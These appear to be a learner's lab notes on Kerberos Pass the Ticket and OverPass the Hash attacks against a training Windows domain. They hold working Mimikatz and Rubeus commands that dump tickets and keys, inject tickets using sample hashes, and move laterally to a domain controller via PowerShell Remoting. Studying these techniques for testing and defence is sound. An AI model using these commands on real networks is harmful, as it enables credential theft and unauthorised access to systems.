# Pass the Ticket from Windows

* The `TGT - Ticket Granting Ticket` is the first ticket obtained on a Kerberos system. The TGT permits the client to obtain additional Kerberos tickets or `TGS`.
* The `TGS - Ticket Granting Service` is requested by users who want to use a service. These tickets allow services to verify the user's identity.

## methods to get a ticket using `Mimikatz` and `Rubeus`

we get local admin rights somehow then,


> [!NOTE]
> As a non-administrative user, you can only get your tickets, but as a local administrator, you can collect everything.


#### we can get tickets with mimikatz module named sekurlsa::tickets /export. which gives file .kirbi

```
sekurlsa::tickets /export
```

![[image 4 2.png]]
Note: At the time of writing, using Mimikatz version 2.2.0 20220919, if we run "sekurlsa::ekeys" it presents all hashes as des_cbc_md4 on some Windows 10 versions. Exported tickets (sekurlsa::tickets /export) do not work correctly due to the wrong encryption. It is possible to use these hashes to generate new tickets or use Rubeus to export tickets in base64 format.


#### Rubeus - Export Tickets
![[image 5 1.png]]



> [!NOTE]
> Note: To collect all tickets we need to execute Mimikatz or Rubeus as an administrator.


### Pass the Key or OverPass the Hash

The Pass the Key or OverPass the Hash approach converts a hash/key (rc4\_hmac, aes256\_cts\_hmac\_sha1, etc.) for a domain-joined user into a full Ticket-Granting-Ticket (TGT).

```
sekurlsa::ekeys
```

![[image 6 1.png]]


with AES256\_HMAC and RC4\_HMAC keys, we can perform the OverPass the Hash or Pass the Key attack using Mimikatz and Rubeus

![[image 7 1.png]]


**This will create a new cmd.exe window that we can use to request access to any service we want in the context of the target user.**

### Rubeus - Pass the Key or OverPass the Hash

don't know why but not working


```
Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```

![[image 8 1.png]]


> [!NOTE]
> Note: Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.


## Pass the Ticket

we can use this kerberos tickets to do PtT attack

### Mimikatz usage


```cmd-session
kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
```

![[image 9 1.png]]
Pass the ticket


### Rubeus usage

```cmd-session
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```

![[image 11 1.png]]

![[image 13 1.png]]
we can authenticate as that user

Another way is to import the ticket into the current session using the `.kirbi` file from the disk

use a ticket exported from Mimikatz and import it using Pass the Ticket

```cmd-session
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```

![[spaces_ROk2K3zZId4eElllNbe7_uploads_ighHbI7fk2sgjLDvJLxb_image.webp]]

### **Convert .kirbi to Base64 Format**

convert to base64"
```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
```

```cmd-session
Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/<SNIP>
```

![[image 14 1.png]]

#### **with above three methods of** Rubeus we can achive same things!

## Pass The Ticket with PowerShell Remoting (Windows)

[PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2) allows us to run scripts or commands on a remote computer

To create a PowerShell Remoting session on a remote computer, you must have administrative permissions, be a member of the Remote Management Users group, or have explicit PowerShell Remoting permissions in your session configuration

Suppose we find a user account that doesn't have administrative privileges on a remote computer but is a member of the Remote Management Users group. In that case, we can use PowerShell Remoting to connect to that computer and execute commands

### Mimikatz

{% code overflow="wrap" %}
```cmd-session
kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
```
{% endcode %}

```
Enter-PSSession -ComputerName DC01
```

![[image 15 1.png]]

### Rubeus

#### **Create a Sacrificial Process with Rubeus**

![[spaces_ROk2K3zZId4eElllNbe7_uploads_IAsZeRypxx60ExKHhZAv_image.webp]]
Logon type 9

The above command will open a new cmd window. From that window, we can execute Rubeus to request a new TGT with the option `/ptt` to import the ticket into our current session and connect to the DC using PowerShell Remoting

#### **Rubeus - Pass the Ticket for Lateral Movement**


```cmd-session
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
```

![[image 16 1.png]]

# Q. What is difference between pass the key/OverPass the Hash and Pass the ticket?

if you already have a ticket, you can PTT, if you have credentials or NTLM hash and wants to get a ticket for future authentication, you can OPTH. PTT uses kerberos to autenticate

it depends on what we want, but both gives same result

# Q. What exactly do we get with pass the ticket and Pass The Ticket with PowerShell Remoting?

with PTT we can get that particular allocated share

the machine you ran mimikatz on probably isn't the DC so obviously `C:\john` doesn't exist, when you psremote you're opening a shell on DC if that's the ip you set
